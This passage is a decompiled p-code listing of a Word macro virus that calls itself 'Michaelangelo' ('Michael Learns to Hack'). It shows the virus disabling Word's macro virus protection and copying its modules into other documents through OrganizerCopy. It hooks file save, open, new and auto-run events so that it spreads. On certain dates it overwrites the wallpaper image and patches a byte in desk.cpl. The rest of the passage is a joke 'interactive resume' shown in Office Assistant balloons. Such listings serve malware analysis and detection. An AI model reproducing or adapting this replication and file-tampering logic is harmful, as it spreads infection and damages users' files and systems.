' 	Ld odInfected 
' 	Not 
' 	IfBlock 
' Line #273:
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld openDoc 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0015 "MichaelangeloVictory2"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #274:
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld openDoc 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "Byron2"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #275:
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld openDoc 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000A "Character2"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #276:
' 	EndIfBlock 
' Line #277:
' Line #278:
' 	StartForVariable 
' 	Ld openDoc 
' 	EndForVariable 
' 	NextVar 
' Line #279:
' Line #280:
' Line #281:
' 	EndSub 
' Line #282:
' Line #283:
' 	FuncDefn (Sub FileSave())
' Line #284:
' 	Dim 
' 	VarDefn B 0x0007
' Line #285:
' 	Dim 
' 	VarDefn l (As Long)
' Line #286:
' 	Dim 
' 	VarDefn NdxMac (As Long)
' Line #287:
' 	Dim 
' 	VarDefn infected (As Boolean)
' Line #288:
' Line #289:
' 	Dim 
' 	VarDefn ls (As String)
' Line #290:
' 	Dim 
' 	VarDefn spos (As Long)
' Line #291:
' 	Dim 
' 	VarDefn Wallname (As String)
' Line #292:
' 	Dim 
' 	VarDefn Wallfound (As Boolean)
' Line #293:
' 	Dim 
' 	VarDefn chgHdr (As Byte)
' Line #294:
' Line #295:
' 	Dim 
' 	VarDefn sfor (As Long)
' Line #296:
' 	Dim 
' 	VarDefn PauseTime
' 	VarDefn Start
' 	VarDefn Finish
' 	VarDefn TotalTime
' Line #297:
' Line #298:
' Line #299:
' 	OnError (Resume Next) 
' Line #300:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #301:
' Line #302:
' 	Ld Selection 
' 	MemLd Then 
' 	LitStr 0x0005 "Ablog"
' 	Eq 
' 	IfBlock 
' Line #303:
' 	LitVarSpecial (True)
' 	St ShowVisualBasicEditor 
' Line #304:
' 	End 
' Line #305:
' 	EndIfBlock 
' Line #306:
' Line #307:
' 	LitVarSpecial (False)
' 	St Wallfound 
' Line #308:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0017 
' 	Gt 
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	Ld vbThursday 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #309:
' 	LitStr 0x0012 "c:\windows\win.ini"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #310:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #311:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Input 
' 	Ld ls 
' 	InputItem 
' 	InputDone 
' Line #312:
' 	Ld ls 
' 	LitStr 0x0009 "Wallpaper"
' 	FnInStr 
' 	St spos 
' Line #313:
' 	Ld spos 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #314:
' 	Ld ls 
' 	Ld spos 
' 	LitDI2 0x000A 
' 	Add 
' 	ArgsLd Mid$ 0x0002 
' 	St Wallname 
' Line #315:
' 	Ld Wallname 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0006 "(None)"
' 	ArgsLd UCase 0x0001 
' 	Ne 
' 	IfBlock 
' Line #316:
' 	LitVarSpecial (True)
' 	St Wallfound 
' Line #317:
' 	EndIfBlock 
' Line #318:
' 	ExitDo 
' Line #319:
' 	EndIfBlock 
' Line #320:
' 	Loop 
' Line #321:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #322:
' Line #323:
' 	EndIfBlock 
' Line #324:
' Line #325:
' 	QuoteRem 0x0004 0x000F "WallpaperChange"
' Line #326:
' 	Ld Wallfound 
' 	Ld WallpaperChange 
' 	Not 
' 	And 
' 	IfBlock 
' Line #327:
' 	QuoteRem 0x0008 0x0007 "writing"
' Line #328:
' 	Ld Wallname 
' 	Ld vbArchive 
' 	ArgsCall (Call) SetAttr 0x0002 
' Line #329:
' 	Ld Byron2 
' 	MemLd Image1 
' 	MemLd Picture 
' 	Ld Wallname 
' 	ArgsCall (Call) SavePicture 0x0002 
' Line #330:
' Line #331:
' 	LitStr 0x001A "c:\windows\system\desk.cpl"
' 	Ld vbArchive 
' 	ArgsCall (Call) SetAttr 0x0002 
' Line #332:
' 	LitStr 0x001A "c:\windows\system\desk.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Random)
' Line #333:
' 	LitDI2 0x0042 
' 	St chgHdr 
' Line #334:
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDI2 0x0001 
' 	Ld chgHdr 
' 	PutRec 
' Line #335:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #336:
' 	LitVarSpecial (True)
' 	St WallpaperChange 
' Line #337:
' 	EndIfBlock 
' Line #338:
' Line #339:
' 	LitStr 0x0029 "Michaelangelo "The Skulltor\n" Buenarroti"
' 	St Signature 
' Line #340:
' Line #341:
' Line #342:
' 	ArgsCall (Call) OnlyUs 0x0000 
' Line #343:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #344:
' Line #345:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0017 
' 	Gt 
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	Ld vbSaturday 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #346:
' 	StartForVariable 
' 	Ld sfor 
' 	EndForVariable 
' 	LitDI2 0x0032 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #347:
' 	Ld sfor 
' 	LitStr 0x0001 " "
' 	ArgsLd String$ 0x0002 
' 	LitStr 0x0016 "Michael Learns to Hack"
' 	Concat 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #348:
' 	LitR8 0x0000 0x0000 0x0000 0x3F90 
' 	St PauseTime 
' 	QuoteRem 0x0023 0x000E " Set duration."
' Line #349:
' 	Ld Timer 
' 	St Start 
' 	QuoteRem 0x001C 0x0010 " Set start time."
' Line #350:
' 	Ld Timer 
' 	Ld Start 
' 	Ld PauseTime 
' 	Add 
' 	Lt 
' 	DoWhile 
' Line #351:
' 	ArgsCall DoEvents 0x0000 
' 	QuoteRem 0x001C 0x001A " Yield to other processes."
' Line #352:
' 	Loop 
' Line #353:
' Line #354:
' 	ArgsCall DoEvents 0x0000 
' Line #355:
' 	StartForVariable 
' 	Ld sfor 
' 	EndForVariable 
' 	NextVar 
' Line #356:
' 	LitStr 0x0021 "And Hope You'll Learn from It Too"
' 	Ld Application 
' 	MemSt StatusBar 
' Line #357:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001D 
' 	Eq 
' 	ElseIfBlock 
' Line #358:
' 	Ld Byron2 
' 	ArgsMemCall Show 0x0000 
' Line #359:
' 	EndIfBlock 
' Line #360:
' Line #361:
' Line #362:
' Line #363:
' 	EndSub 
' Line #364:
' 	FuncDefn (Sub FileClose())
' Line #365:
' 	OnError (Resume Next) 
' Line #366:
' 	ArgsCall (Call) OnlyUs 0x0000 
' Line #367:
' 	QuoteRem 0x0004 0x0038 "If ActiveDocument.Saved = False Then ActiveDocument.Save"
' Line #368:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #369:
' 	EndSub 
' Line #370:
' 	FuncDefn (Sub FileExit())
' Line #371:
' 	OnError (Resume Next) 
' Line #372:
' 	ArgsCall (Call) OnlyUs 0x0000 
' Line #373:
' 	QuoteRem 0x0004 0x0038 "If ActiveDocument.Saved = False Then ActiveDocument.Save"
' Line #374:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #375:
' 	EndSub 
' Line #376:
' 	FuncDefn (Sub FileNew())
' Line #377:
' 	Dim 
' 	VarDefn d (As Document)
' Line #378:
' 	OnError (Resume Next) 
' Line #379:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #380:
' 	SetStmt 
' 	Ld Documents 
' 	MemLd Add 
' 	Set d 
' Line #381:
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld d 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0015 "MichaelangeloVictory2"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #382:
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld d 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "Byron2"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #383:
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld d 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000A "Character2"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #384:
' 	EndSub 
' Line #385:
' 	FuncDefn (Sub AutoOpen())
' Line #386:
' 	OnError (Resume Next) 
' Line #387:
' 	ArgsCall (Call) OnlyUs 0x0000 
' Line #388:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #389:
' 	EndSub 
' Line #390:
' 	FuncDefn (Sub AutoExec())
' Line #391:
' 	OnError (Resume Next) 
' Line #392:
' 	ArgsCall (Call) OnlyUs 0x0000 
' Line #393:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #394:
' 	EndSub 
' Line #395:
' 	FuncDefn (Sub FileSaveAs())
' Line #396:
' 	OnError (Resume Next) 
' Line #397:
' 	ArgsCall (Call) OnlyUs 0x0000 
' Line #398:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #399:
' 	EndSub 
' Line #400:
' 	FuncDefn (Sub FilePageSetup())
' Line #401:
' 	OnError (Resume Next) 
' Line #402:
' 	ArgsCall (Call) OnlyUs 0x0000 
' Line #403:
' 	Ld wdDialogFilePageSetup 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #404:
' 	EndSub 
' Line #405:
' 	FuncDefn (Sub FilePrint())
' Line #406:
' 	OnError (Resume Next) 
' Line #407:
' 	ArgsCall (Call) OnlyUs 0x0000 
' Line #408:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #409:
' 	EndSub 
' Line #410:
' 	FuncDefn (Sub FileOpen())
' Line #411:
' 	QuoteRem 0x0000 0x0000 ""
' Line #412:
' 	QuoteRem 0x0000 0x000F " FileOpen Macro"
' Line #413:
' 	QuoteRem 0x0000 0x0027 " Opens an existing document or template"
' Line #414:
' 	QuoteRem 0x0000 0x0000 ""
' Line #415:
' 	Dim 
' 	VarDefn prevDocCount (As Integer)
' Line #416:
' 	Dim 
' 	VarDefn NdxMac (As Long)
' Line #417:
' 	Dim 
' 	VarDefn infected (As Boolean)
' Line #418:
' Line #419:
' 	Dim 
' 	VarDefn resBal
' 	QuoteRem 0x001C 0x0004 "next"
' Line #420:
' 	Dim 
' 	VarDefn resBal2
' 	QuoteRem 0x001C 0x0004 "back"
' Line #421:
' Line #422:
' 	Dim 
' 	VarDefn resBalMess
' Line #423:
' Line #424:
' 	Dim 
' 	VarDefn resOpt (As Long)
' Line #425:
' Line #426:
' 	Dim 
' 	VarDefn l (As Long)
' Line #427:
' Line #428:
' Line #429:
' 	Dim (Const) 
' 	LitDI2 0x000C 
' 	UMi 
' 	VarDefn butClose
' Line #430:
' 	Dim (Const) 
' 	LitDI2 0x0005 
' 	UMi 
' 	VarDefn butBack
' Line #431:
' 	Dim (Const) 
' 	LitDI2 0x0006 
' 	UMi 
' 	VarDefn butNext
' Line #432:
' Line #433:
' Line #434:
' 	Dim (Const) 
' 	LitDI2 0x0001 
' 	VarDefn resmSchooling
' Line #435:
' 	Dim (Const) 
' 	LitDI2 0x0002 
' 	VarDefn resmSkills
' Line #436:
' 	Dim (Const) 
' 	LitDI2 0x0003 
' 	VarDefn resmJobExperiences
' Line #437:
' 	Dim (Const) 
' 	LitDI2 0x0004 
' 	VarDefn resmPersonalBackground
' Line #438:
' 	Dim (Const) 
' 	LitDI2 0x0005 
' 	VarDefn resmPersonalForeground
' Line #439:
' Line #440:
' 	Dim (Const) 
' 	LitDI2 0x0001 
' 	VarDefn resmCharRef
' Line #441:
' 	Dim (Const) 
' 	LitDI2 0x0002 
' 	VarDefn resmQuote
' Line #442:
' 	Dim (Const) 
' 	LitDI2 0x0003 
' 	VarDefn resmInsideStory
' Line #443:
' Line #444:
' 	Dim 
' 	VarDefn michaelangeloExist (As Boolean)
' Line #445:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #446:
' 	Dim 
' 	VarDefn itemName (As String)
' Line #447:
' Line #448:
' Line #449:
' Line #450:
' 	OnError (Resume Next) 
' Line #451:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #452:
' Line #453:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #454:
' Line #455:
' 	Ld Selection 
' 	MemLd Then 
' 	LitStr 0x0008 "markbuen"
' 	Eq 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001E 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #456:
' 	QuoteRem 0x000C 0x0010 " put resume here"
' Line #457:
' 	SetStmt 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	Set resBalMess 
' Line #458:
' Line #459:
' 	Do 
' Line #460:
' 	SetStmt 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	Set resBal 
' Line #461:
' 	Ld msoAnimationListensToComputer 
' 	Ld resBal 
' 	MemSt Animation 
' Line #462:
' 	LitStr 0x0019 "Michael Learns To Hack..."
' 	Ld resBal 
' 	MemSt Heading 
' Line #463:
' 	LineCont 0x0008 10 00 1E 00 1E 00 1E 00
' 	LitStr 0x0012 "iNTERACTIVE rESUME"
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0012 "Desired Position: "
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0033 "  Programmer / Technical Writer / Computer Salesman"
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0033 " - - - - - - - - - - - - - - - - - - - - - - - - - "
' 	Concat 
' 	Ld resBal 
' 	MemSt Then 
' Line #464:
' Line #465:
' Line #466:
' 	LitStr 0x000C "My Schooling"
' 	Ld resmSchooling 
' 	Ld resBal 
' 	ArgsMemLd Labels 0x0001 
' 	MemSt Then 
' Line #467:
' 	LitStr 0x0009 "My Skills"
' 	Ld resmSkills 
' 	Ld resBal 
' 	ArgsMemLd Labels 0x0001 
' 	MemSt Then 
' Line #468:
' 	LitStr 0x000F "Job Experiences"
' 	LitDI2 0x0003 
' 	Ld resBal 
' 	ArgsMemLd Labels 0x0001 
' 	MemSt Then 
' Line #469:
' 	LitStr 0x0013 "Personal Background"
' 	LitDI2 0x0004 
' 	Ld resBal 
' 	ArgsMemLd Labels 0x0001 
' 	MemSt Then 
' Line #470:
' 	LitStr 0x0013 "Personal Foreground"
' 	LitDI2 0x0005 
' 	Ld resBal 
' 	ArgsMemLd Labels 0x0001 
' 	MemSt Then 
' Line #471:
' 	Ld msoButtonSetNextClose 
' 	Ld resBal 
' 	MemSt Button 
' Line #472:
' 	Ld resBal 
' 	MemLd Show 
' 	St resOpt 
' Line #473:
' 	Ld resOpt 
' 	SelectCase 
' Line #474:
' 	Ld resmSchooling 
' 	Case 
' 	CaseDone 
' Line #475:
' 	Ld msoAnimationWritingNotingSomething 
' 	Ld resBalMess 
' 	MemSt Animation 
' Line #476:
' 	LitStr 0x000C "My Schooling"
' 	Ld resBalMess 
' 	MemSt Heading 
' Line #477:
' 	LitDI2 0x0000 
' 	Ld resBalMess 
' 	MemLd Labels 
' 	MemSt Count 
' Line #478:
' 	LineCont 0x0014 0B 00 2A 00 17 00 2A 00 1E 00 2A 00 2A 00 2A 00 31 00 2A 00
' 	LitStr 0x000A "Elementary"
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0022 "   Pio del Pilar Elementary School"
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000B "High School"
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0022 "   Philippine Christian University"
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0007 "College"
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001D "   AMACConda Computer College"
' 	Concat 
' 	Ld resBalMess 
' 	MemSt Then 
' Line #479:
' 	Ld resBalMess 
' 	ArgsMemCall Show 0x0000 
' Line #480:
' Line #481:
' 	Ld resmSkills 
' 	Case 
' 	CaseDone 
' Line #482:
' 	Ld msoAnimationGetTechy 
' 	Ld resBalMess 
' 	MemSt Animation 
' Line #483:
' 	LitStr 0x0009 "My Skills"
' 	Ld resBalMess 
' 	MemSt Heading 
' Line #484:
' 	LineCont 0x0004 10 00 2A 00
' 	LitStr 0x009B "   Proficient with varius languages like C/C++, Assembly, Pascal, COBOL, Foxpro, SQL, Visual Basic, Clarion, JavaScript, VB for Application, VBScript, HTML"
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x00B5 "   Proficient in Application Softwares like Adobe Photoshop, Resourcce Workshop, Microangelo, Lotus Smart Suite, Aldus Pagemaker, Frontpage, Powerpoint, and of course Word and Excel"
' 	Concat 
' 	Ld resBalMess 
' 	MemSt Then 
' Line #485:
' 	LitDI2 0x0000 
' 	Ld resBalMess 
' 	MemLd Labels 
' 	MemSt Count 
' Line #486:
' 	Ld resBalMess 
' 	ArgsMemCall Show 0x0000 
' Line #487:
' Line #488:
' 	Ld resmJobExperiences 
' 	Case 
' 	CaseDone 
' Line #489:
' Line #490:
' 	Ld msoAnimationWorkingAtSomething 
' 	Ld resBalMess 
' 	MemSt Animation 
' Line #491:
' 	LitStr 0x000B "Experiences"
' 	Ld resBalMess 
' 	MemSt Heading 
' Line #492:
' 	Ld msoBalloonTypeBullets 
' 	Ld resBalMess 
' 	MemSt BalloonType 
' Line #493:
' Line #494:
' 	LitStr 0x0000 ""
' 	Ld resBalMess 
' 	MemSt Then 
' Line #495:
' 	LitDI2 0x0004 
' 	Ld resBalMess 
' 	MemLd Labels 
' 	MemSt Count 
' Line #496:
' 	LitStr 0x002C "INNODATA -- Typereader (corrects OCR errors)"
' 	LitDI2 0x0001 
' 	Ld resBalMess 
' 	ArgsMemLd Labels 0x0001 
' 	MemSt Then 
' Line #497:
' 	LitStr 0x0011 "SENCOR -- Encoder"
' 	LitDI2 0x0002 
' 	Ld resBalMess 
' 	ArgsMemLd Labels 0x0001 
' 	MemSt Then 
' Line #498:
' 	LitStr 0x0022 "VMSCI -- Pseudo Programmer Trainee"
' 	LitDI2 0x0003 
' 	Ld resBalMess 
' 	ArgsMemLd Labels 0x0001 
' 	MemSt Then 
' Line #499:
' 	LitStr 0x001A "GenDiesel -- Super Encoder"
' 	LitDI2 0x0004 
' 	Ld resBalMess 
' 	ArgsMemLd Labels 0x0001 
' 	MemSt Then 
' Line #500:
' Line #501:
' 	Ld resBalMess 
' 	ArgsMemCall Show 0x0000 
' Line #502:
' Line #503:
' 	Ld resmPersonalBackground 
' 	Case 
' 	CaseDone 
' Line #504:
' 	Ld msoAnimationCharacterSuccessMajor 
' 	Ld resBalMess 
' 	MemSt Animation 
' Line #505:
' Line #506:
' 	LitStr 0x0013 "Personal Background"
' 	Ld resBalMess 
' 	MemSt Heading 
' Line #507:
' 	Ld msoBalloonTypeBullets 
' 	Ld resBalMess 
' 	MemSt BalloonType 
' Line #508:
' Line #509:
' 	LitStr 0x0000 ""
' 	Ld resBalMess 
' 	MemSt Then 
' Line #510:
' 	LitDI2 0x0003 
' 	Ld resBalMess 
' 	MemLd Labels 
' 	MemSt Count 
' Line #511:
' 	LitStr 0x0050 "Hardworking, Softworking, Quiet(low-noise), Sociable Person especially on Party "
' 	LitDI2 0x0001 
' 	Ld resBalMess 
' 	ArgsMemLd Labels 0x0001 
' 	MemSt Then 
' Line #512:
' 	LitStr 0x0082 "Reliable, with Good Interpersonal Communicatin Skills and Intrapersonal Communication Skills (8 data bits, odd parity, 1 stop bit)"
' 	LitDI2 0x0002 
' 	Ld resBalMess 
' 	ArgsMemLd Labels 0x0001 
' 	MemSt Then 
' Line #513:
' 	LitStr 0x007D "Goal-oriented, Success-oriented, Journey-Oriented, Object-Oriented Person, w/ Good Moral Character and w/ Pissing Personality"
' 	LitDI2 0x0003 
' 	Ld resBalMess 
' 	ArgsMemLd Labels 0x0001 
' 	MemSt Then 
' Line #514:
' Line #515:
' 	Ld resBalMess 
' 	ArgsMemCall Show 0x0000 
' Line #516:
' Line #517:
' 	Ld resmPersonalForeground 
' 	Case 
' 	CaseDone 
' Line #518:
' Line #519:
' 	Ld msoAnimationGetAttentionMinor 
' 	Ld resBalMess 
' 	MemSt Animation 
' Line #520:
' 	LitStr 0x0013 "Personal Foreground"
' 	Ld resBalMess 
' 	MemSt Heading 
' Line #521:
' 	Ld msoBalloonTypeBullets 
' 	Ld resBalMess 
' 	MemSt BalloonType 
' Line #522:
' Line #523:
' 	LitStr 0x0000 ""
' 	Ld resBalMess 
' 	MemSt Then 
' Line #524:
' 	LitDI2 0x0005 
' 	Ld resBalMess 
' 	MemLd Labels 
' 	MemSt Count 
' Line #525:
' 	LitStr 0x0026 "Black-eyes, black hair, black nostrils"
' 	LitDI2 0x0001 
' 	Ld resBalMess 
' 	ArgsMemLd Labels 0x0001 
' 	MemSt Then 
' Line #526:
' 	LitStr 0x001D "Cute (Patingin nga ng Dimple)"
' 	LitDI2 0x0002 
' 	Ld resBalMess 
' 	ArgsMemLd Labels 0x0001 
' 	MemSt Then 
' Line #527:
' 	LitStr 0x0017 "Down-to-Earth (ALIEN?!)"
' 	LitDI2 0x0003 
' 	Ld resBalMess 
' 	ArgsMemLd Labels 0x0001 
' 	MemSt Then 
' Line #528:
' 	LitStr 0x0019 "Boy-Next-Windows '95 Type"
' 	LitDI2 0x0004 
' 	Ld resBalMess 
' 	ArgsMemLd Labels 0x0001 
' 	MemSt Then 
' Line #529:
' 	LitStr 0x0019 "Macho-chulis ang mga buto"
' 	LitDI2 0x0005 
' 	Ld resBalMess 
' 	ArgsMemLd Labels 0x0001 
' 	MemSt Then 
' Line #530:
' Line #531:
' 	Ld resBalMess 
' 	ArgsMemCall Show 0x0000 
' Line #532:
' Line #533:
' Line #534:
' 	Ld butNext 
' 	Case 
' 	CaseDone 
' Line #535:
' Line #536:
' 	SetStmt 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	Set resBal2 
' Line #537:
' 	LitDI2 0x0003 
' 	Ld resBal2 
' 	MemLd Labels 
' 	MemSt Count 
' Line #538:
' 	LitStr 0x0019 "Michael Learns To Hack..."
' 	Ld resBal2 
' 	MemSt Heading 
' Line #539:
' 	LitStr 0x0012 "Interactive Resume"
' 	Ld resBal2 
' 	MemSt Then 
' Line #540:
' 	LitStr 0x0014 "Character References"
' 	LitDI2 0x0001 
' 	Ld resBal2 
' 	ArgsMemLd Labels 0x0001 
' 	MemSt Then 
' Line #541:
' 	LitStr 0x0014 "Quote for the Moment"
' 	LitDI2 0x0002 
' 	Ld resBal2 
' 	ArgsMemLd Labels 0x0001 
' 	MemSt Then 
' Line #542:
' 	LitStr 0x000C "Inside Story"
' 	LitDI2 0x0003 
' 	Ld resBal2 
' 	ArgsMemLd Labels 0x0001 
' 	MemSt Then 
' Line #543:
' 	Ld msoButtonSetBackClose 
' 	Ld resBal2 
' 	MemSt Button 
' Line #544:
' 	Ld resBal2 
' 	MemLd Show 
' 	St resOpt 
' Line #545:
' 	Ld resOpt 
' 	SelectCase 
' Line #546:
' 	Ld resmCharRef 
' 	Case 
' 	CaseDone 
' Line #547:
' 	Ld Character2 
' 	ArgsMemCall Show 0x0000 
' Line #548:
' 	Ld resmQuote 
' 	Case 
' 	CaseDone 
' Line #549:
' 	ArgsLd Quote 0x0000 
' 	St l 
' Line #550:
' 	Ld resmInsideStory 
' 	Case 
' 	CaseDone 
' Line #551:
' 	Ld Byron2 
' 	ArgsMemCall Show 0x0000 
' Line #552:
' 	EndSelect 
' Line #553:
' Line #554:
' 	EndSelect 
' Line #555:
' Line #556:
' 	Ld resOpt 
' 	LitDI2 0x000C 
' 	UMi 
' 	Ne 
' 	LoopWhile 
' Line #557:
' Line #558:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001E 
' 	Ne 
' 	IfBlock 
' Line #559:
' 	End 
' Line #560:
' 	EndIfBlock 
' Line #561:
' Line #562:
' 	EndIfBlock 
' Line #563:
' 	EndIfBlock 
' Line #564:
' Line #565:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #566:
' 	ArgsCall (Call) OnlyUs 0x0000 
' Line #567:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #568:
' 	EndSub 
' Line #569:
' 	FuncDefn (Sub AutoClose())
' Line #570:
' 	OnError (Resume Next) 
' Line #571:
' 	ArgsCall (Call) OnlyUs 0x0000 
' Line #572:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #573:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #574:
' 	EndSub 
' Line #575:
' 	FuncDefn (Sub AutoExit())
' Line #576:
' 	OnError (Resume Next) 
' Line #577:
' 	ArgsCall (Call) OnlyUs 0x0000 
' Line #578:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #579:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #580:
' 	EndSub 
' Line #581:
' Macros/VBA/Byron2 - 3035 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' Line #33:
' Line #34:
' Line #35:
' Line #36:
' Line #37:
' Line #38:
' Line #39:
' Line #40:
' Line #41:
' 	FuncDefn (Private Sub Inet1_BeforeUpdate(ByVal Cancel As ))
' Line #42:
' Line #43:
' 	EndSub 
' Line #44:
' Line #45:
' 	FuncDefn (Private Sub Inet1_Enter())
' Line #46:
' Line #47:
' 	EndSub 
' Line #48:
' Line #49:
' 	FuncDefn (Private Sub Inet1_Exit(ByVal Cancel As ))
' Line #50:
' Line #51:
' 	EndSub 
' Line #52:
' Line #53:
' 	FuncDefn (Private Sub Inet1_StateChanged(ByVal State As Integer))
' Line #54:
' Line #55:
' 	EndSub 
' Line #56:
' Line #57:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #58:
' 	Dim (Static) 
' 	VarDefn B (As Boolean)
' Line #59:
' Line #60:
' 	Ld B 
' 	IfBlock 
' Line #61:
' 	LitStr 0x0005 "Close"
' 	Ld CommandButton1 
' 	MemSt Caption 
' Line #62:
' 	ElseBlock 
' Line #63:
' 	LitStr 0x0004 "Open"
' 	Ld CommandButton1 
' 	MemSt Caption 
' Line #64:
' 	EndIfBlock 
' Line #65:
' 	Ld B 
' 	Not 
' 	St B 
' Line #66:
' Line #67:
